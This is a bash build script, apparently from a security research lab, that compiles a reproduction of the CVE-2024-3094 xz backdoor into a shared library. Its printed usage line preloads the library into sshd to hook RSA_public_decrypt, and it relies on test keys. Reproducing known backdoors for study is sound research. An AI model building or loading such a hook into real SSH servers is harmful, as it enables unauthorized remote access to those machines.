#!/bin/bash
# Build the CVE-2024-3094 backdoor reproduction shared library.
#
# Compiles backdoor_hook.c into liblzma_backdoor.so, which can be
# loaded via LD_PRELOAD to hook RSA_public_decrypt in OpenSSH.
#
# Prerequisites: gcc, libssl-dev (OpenSSL development headers)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

# Check that the test public key header exists
if [ ! -f "test_ed448_public.h" ]; then
    echo "[!] test_ed448_public.h not found. Run generate_keys.py first."
    echo "    python3 generate_keys.py"
    exit 1
fi

echo "[*] Compiling CVE-2024-3094 backdoor reproduction..."

gcc -shared -fPIC -o liblzma_backdoor.so \
    backdoor_hook.c \
    -I"$SCRIPT_DIR" \
    -lssl -lcrypto -ldl \
    -Wall -Wextra -Wno-unused-parameter \
    -O2

echo "[+] Built: liblzma_backdoor.so"
echo "[*] Usage: LD_PRELOAD=$SCRIPT_DIR/liblzma_backdoor.so /usr/sbin/sshd"
